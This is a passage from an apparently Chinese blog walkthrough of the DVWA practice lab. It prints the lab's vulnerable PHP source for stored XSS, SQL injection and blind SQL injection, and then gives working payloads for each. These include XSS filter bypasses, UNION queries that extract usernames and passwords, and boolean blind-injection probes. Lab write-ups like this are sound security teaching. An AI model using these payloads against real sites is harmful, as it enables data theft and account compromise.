class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-18"><a href="#解决方法-18" class="headerlink" title="解决方法"></a>解决方法</h3><p>（1）Message处使用了htmlspecialchars()函数，将字符全部转为了HTML实体，因此Message处无法使用XSS形成攻击。</p>
<p>（2）name处做了长度限制，因此考虑使用抓包在BP中修改name的值，还有就是他会将 <script> 转化为空，所有考虑使用双写或者大小写去绕过。</p>
<p>大小写绕过：<scRIPt>alert(1) </script></p>
<p>双写绕过：&lt;scr<script>ipt>alert(1)</script></p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669718352165-6c1374d2-525e-4446-8f1d-ce1eed9539e9.png" alt="img"></p>
<h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><h3 id="源码分析-11"><a href="#源码分析-11" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-19"><a href="#解决方法-19" class="headerlink" title="解决方法"></a>解决方法</h3><p>（1）Message处相比Medium难度没有做太多的变化，因此不在考虑这里。</p>
<p>（2）Nmae处对 <script> 做了限制，各种形式的 <script> 都不行了，考虑使用其他的标签，比如img</p>
<p>使用BP改name即可</p>
<img src=1 onerror=alert(1)>

<h1 id="SQL-Injection（SQL注入）"><a href="#SQL-Injection（SQL注入）" class="headerlink" title="SQL Injection（SQL注入）"></a>SQL Injection（SQL注入）</h1><p>SQL Injection（SQL注入），是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。</p>
<h3 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h3><p>拿到一个查询条件的web网页，就需要对输入框做以下的事情</p>
<p>1.判断是否存在注入，注入是字符型还是数字型</p>
<p>2.猜解SQL查询语句中的字段数</p>
<p>3.确定显示的字段顺序</p>
<p>4.获取当前数据库</p>
<p>5.获取数据库中的表</p>
<p>6.获取表中的字段名</p>
<p>7.下载数据</p>
<h2 id="LOW-3"><a href="#LOW-3" class="headerlink" title="LOW"></a>LOW</h2><h3 id="源码分析-12"><a href="#源码分析-12" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line"><span class="comment">//获取ID字段</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line"><span class="comment">//拼接SQL语句并查询</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-20"><a href="#解决方法-20" class="headerlink" title="解决方法"></a>解决方法</h3><p>（1）首先找到注入点，判断注入的类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">1\</span><br><span class="line">1&#x27; #</span><br></pre></td></tr></table></figure>

<p><img src="1669768434312-f2be9286-8146-4da3-9a10-ade2d120e1de.png" alt="img"></p>
<p>（2）使用二分法判断字段（order by   5,3,2），最终判断存在2个字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 5 #</span><br><span class="line">1&#x27; order by 3 #</span><br><span class="line">1&#x27; order by 2 #</span><br></pre></td></tr></table></figure>

<p><img src="1669768491880-b1e480dc-5b0a-4b2c-bd6e-1249b8c6f5b3.png" alt="img"></p>
<p>（3）显示报错位</p>
<p>-1’ union select 1,2 #</p>
<p><img src="1669768801905-f120721f-5e3b-48b6-8909-d7f5774eae6e.png" alt="img"></p>
<p>（4）查找库名</p>
<p>1’ union select version(),database() #</p>
<p><img src="1669768857567-a6a25b48-4b34-404a-a6da-12a168f591e9.png" alt="img"></p>
<p>（5）查找当前数据库中的表</p>
<p>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</p>
<p><img src="1669770130784-92dcd10c-0177-4182-9e95-b81fca440e02.png" alt="img"></p>
<p>（6）查找表users中的字段</p>
<p>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #</p>
<p><img src="1669770274998-0f057da2-214a-4f55-8de1-64661d13d475.png" alt="img"></p>
<p>（7）查找数据</p>
<p>1’ union select group_concat(user),group_concat(password) from users #</p>
<p><img src="1669770393156-0646f944-519e-4bcf-bb78-8fa00ce1d541.png" alt="img"></p>
<h2 id="Mediun-1"><a href="#Mediun-1" class="headerlink" title="Mediun"></a>Mediun</h2><h3 id="源码分析-13"><a href="#源码分析-13" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">//user中x00，n，r，，’，”，x1a转义，防SQL注入</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="variable">$number_of_rows</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>( <span class="variable">$result</span> )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> GET提交方式改成了POST提交方式，还使用了转义预防SQL注入。</p>
<h3 id="解决方法-21"><a href="#解决方法-21" class="headerlink" title="解决方法"></a>解决方法</h3><p>同low级别，只不过是在bp上操作</p>
<h2 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h2><h3 id="源码分析-14"><a href="#源码分析-14" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span> [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line"><span class="comment">//【select * from tableName limit i,n 】</span></span><br><span class="line">tableName : 为数据表；</span><br><span class="line">i : 为查询结果的索引值（默认从<span class="number">0</span>开始）；</span><br><span class="line">n : 为查询结果返回的数量</span><br><span class="line">查询第一条数据</span><br><span class="line">select * <span class="keyword">from</span> student limit <span class="number">1</span></span><br><span class="line">查询第二条数据</span><br><span class="line">select * <span class="keyword">from</span> student limit <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-22"><a href="#解决方法-22" class="headerlink" title="解决方法"></a>解决方法</h3><p>high 级别使用了session 获取id 值，闭合方式单引号闭合。</p>
<p>解决方法同low级别一样</p>
<h1 id="SQL-Injection-Blind-（SQL注入之盲注）"><a href="#SQL-Injection-Blind-（SQL注入之盲注）" class="headerlink" title="SQL Injection(Blind)（SQL注入之盲注）"></a>SQL Injection(Blind)（SQL注入之盲注）</h1><p>SQL Injection(Blind)，SQL盲注，相比于常规的SQL注入，他不会将返回具体的数据信息或语法信息，只会将服务器包装后的信息返回到页面中。</p>
<h3 id="常规SQL注入与SQL盲注详细对比"><a href="#常规SQL注入与SQL盲注详细对比" class="headerlink" title="常规SQL注入与SQL盲注详细对比"></a>常规SQL注入与SQL盲注详细对比</h3><table>
<thead>
<tr>
<th>SQL注入</th>
<th>1.执行SQL注入攻击时，服务器会响应来自数据库服务器的错误信息，信息提示SQL语法不正确等。 2.一般在页面上直接就会显示执行sql语句的结果。</th>
</tr>
</thead>
<tbody><tr>
<td>SQL盲注</td>
<td>1.一般情况，执行SQL盲注，服务器不会直接返回具体的数据库错误or语法错误，而是会返回程序开发所设置的特定信息（也有特例，如基于报错的盲注） 2.一般在页面上不会直接显示sql执行的结果 3.有可能出现不确定sql是否执行的情况</td>
</tr>
</tbody></table>
<p>（参考：<a href="https://www.jianshu.com/p/757626cec742%EF%BC%89">https://www.jianshu.com/p/757626cec742）</a></p>
<h3 id="布尔盲注与时间盲注对比"><a href="#布尔盲注与时间盲注对比" class="headerlink" title="布尔盲注与时间盲注对比"></a>布尔盲注与时间盲注对比</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p> 可通过构造真or假判断条件（数据库各项信息取值的大小比较，如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</p>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p> 通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</p>
<h3 id="SQL盲注流程"><a href="#SQL盲注流程" class="headerlink" title="SQL盲注流程"></a>SQL盲注流程</h3><p>1.判断是否存在注入，注入的类型</p>
<p>2.猜解当前数据库名称</p>
<p>3.猜解数据库中的表名</p>
<p>4.猜解表中的字段名</p>
<p>5.获取表中的字段值</p>
<p>6.验证字段值的有效性</p>
<p>7.获取数据库的其他信息：版本、用户…</p>
<h2 id="LOW-4"><a href="#LOW-4" class="headerlink" title="LOW"></a>LOW</h2><h3 id="源码分析-15"><a href="#源码分析-15" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line"><span class="comment">//最后的判断只有两种</span></span><br><span class="line">num大于<span class="number">0</span>输出User ID exists in the database</span><br><span class="line">num小于等于<span class="number">0</span> 输出User ID is MISSING <span class="keyword">from</span> the database</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-23"><a href="#解决方法-23" class="headerlink" title="解决方法"></a>解决方法</h3><p>对传参没有进行任何检查、过滤，返回参数只有User ID exists in the database.和User ID is MISSING from the database.两种</p>
<p>（1）首先找到注入点，判断注入的类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> </span><br><span class="line"><span class="number">1</span> \ </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; #  猜闭合方式</span></span><br></pre></td></tr></table></figure>

<p><img src="1670044834691-5a74cb64-1e36-4a83-86d5-9e6df307173f.png" alt="img"></p>
<p>（2）查找库名（以数据库名的第一个字母为例）（最终查到的库名：dvwa）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr(database(),1,1)) &gt; 111) # </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">120</span>) <span class="comment"># </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr(database(),1,1)) &gt; 115) # </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">113</span>) <span class="comment"># </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr(database(),1,1)) = 100) #</span></span><br></pre></td></tr></table></figure>

<p><strong>数据库的substr函数用法：</strong></p>
<p>1、SUBSTR(str,pos,len): 从pos开始的位置，截取len个字符</p>
<table>
<thead>
<tr>
<th>1</th>
<th>substr(string ,1,3) ：取string左边第1位置起，3字长的字符串。</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>所以结果为： str</p>
<table>
<thead>
<tr>
<th>1</th>
